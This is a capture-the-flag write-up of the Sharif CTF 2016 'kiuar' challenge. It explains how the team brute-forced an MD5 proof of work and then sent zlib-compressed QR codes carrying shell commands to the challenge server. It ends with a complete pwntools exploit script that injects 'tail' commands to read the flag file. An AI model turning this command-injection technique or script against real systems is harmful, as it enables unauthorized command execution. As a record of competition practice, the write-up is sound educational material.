---
layout: post
title:  "Sharif University CTF 2016: kiuar (pwn 200)"
author: skogler
categories: writeup
---

* **Category:** pwn
* **Points:** 200
* **Description:**

> telnet ctf.sharif.edu 12432
> Trying 213.233.175.130...
> Connected to ctf.sharif.edu.
> Escape character is '^]'.
> Welcome to Sharif blackbox challenge :)
> Proof of work: Are you ready?
> Give me a 32-bit hex integer, whose leftmost 22 bits of its MD5 is 1000001010110000011101.
> You have 60 seconds to reply.

## Write-up

When connecting to the given server address, it would present us with the above
task. The challenge was to compute the MD5 of a 32-bit integer so that the
leftmost 22 bit of the MD5 would match the given value. The bits to match
changed every time a new connection is established, but the length was fixed.
The server would also reject any input with less than 5 characters.

This seemed quite easy at first, but the server would not accept my computed
values. Thankfully, my colleage did interpret the task differently; he found
out that we needed to compute the MD5 of the *hex string representation* of the
32-bit integer, so something like this:

```python
result_md5 = hashlib.md5(hex(i))
```

This finally worked, which brought us the next step of the challenge. We got
these bytes from the server:

```
00000000  78 9c 0b 4e  cd 4b 51 a8  cc 2f 2d 52  08 0c 52 48  │x··N│·KQ·│·/-R│··RH│
00000010  ce 4f 49 b5  e2 8a cc 2f  55 c8 48 2c  4b 55 30 34  │·OI·│···/│U·H,│KU04│
00000020  50 28 4e 4d  ce cf 4b 29  56 28 c9 57  28 4a 2d c8  │P(NM│··K)│V(·W│(J-·│
00000030  a9 d4 e3 02  00 9b f3 10  54                        │····│····│T│
```

We saved this to a file and ran the ```file``` tool on it:

```
result: zlib compressed data
```

Nice, so just run ```zlib.decompress``` on it in python:

```
Send your QR code:
You have 10 seconds to reply.
```

It seemed we could send some data hidden within a QR code. However, sending
this code was not quite easy. The first problem was that the server would only
accept messages compressed with zlib:


```
Your data is not in proper compressed format :(
```

This was solved by compressing the message using zlib. However, we also needed
to get a message of exactly 200 bytes, since the server would reject everything
else. To solve this, we compressed the payload first, then padded the message
with zero bytes so it had a  length of exactly 200.

The hard part was getting a QR code with a size smaller than 200 bytes. It
seems the typical tools to generate QR codes do not optimize for size at all.
After a long time of trial and error, we ended up with the following command to
generate the PNG QR code:

```
qrencode -s 1 -v 1 -m 1 -o test.png "<payload>" && optipng test.png
```

If the length of the payload was not too long (I think about 10 bytes), this
would suffice.  It also took us quite a while to find out that the server would
only recognize the QR code if it had a margin of at least 1 pixels.

When finally succeeded, we found out that we could send shell commands inside the QR code.
There was a file called flag in the server's working directory, which we needed to read:

```
Flag: The output of your command is large, I only send 18 bytes of it :P 
    SharifCTF{b5ffb0e6
```

Since the organizers did not allow us to just cat the file, we needed to run
the script multiple times and inject tail commands with different offsets to
reconstruct the flag manually.

Finally, here is the script we used to get the flag:

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import ctypes
import struct
import hashlib
import sys
import zlib
import os
from pwn import *

context.log_level = 'info'


commands = [
        "tail -c 18 flag",
        "tail -c 36 flag",
        "tail -c 54 flag",
        ]

results = list()

for command in commands:
    os.system('qrencode -s 1 -v 1 -m 1 -o test.png "' + command + '" && optipng test.png')
    zcode = ""

    with open('test.png') as qrfile:
        qrbytes = qrfile.read()
        zcode = zlib.compress(qrbytes)
        print("len: {}".format(len(zcode)))
        zcode = zcode.ljust(200, '\x00')
        print("len: {}".format(len(zcode)))
        if len(zcode) > 200:
            sys.exit()

    conn = remote('ctf.sharif.edu', 12432)
    conn.recvline()
    conn.recvline()
    challenge = conn.recvline()

    data = ctypes.create_string_buffer(4)
    m = hashlib.md5()

    target_bits = challenge.split(" ")[-1][:-2]
    #target_bits = target_bits.ljust(32, '0')
    #target_mask = int(target_bits, 2)
    #print("mask {}".format(bin(target_mask)))

    conn.clean_and_log()

    lower_bound = 0x100000
    upper_bound = 2**32

    for i in xrange(lower_bound, upper_bound):
        integer_hex         = hex(i)
        integer_hex_encoded = integer_hex.encode('utf-8')
        integer_hex_md5 = hashlib.md5()
        integer_hex_md5.update(integer_hex_encoded)

        md5 = integer_hex_md5.hexdigest()

        binary = bin(int(md5, 16))[2:]

        if binary.startswith(target_bits):
            #print("Hash {}".format(md5))
            conn.send(hex(i))
            break

    conn.recvline()
    result = conn.recv()

    with open('test.png') as qrfile:
        qrbytes = qrfile.read()
        zcode = zlib.compress(qrbytes)

        zcode = zcode.ljust(200, '\x00')
        conn.send(zcode)

    conn.recvline()
    res = conn.recv()
    log.info(res)

    results.append(res)

    conn.close()

log.info(",\n".join(results))
```

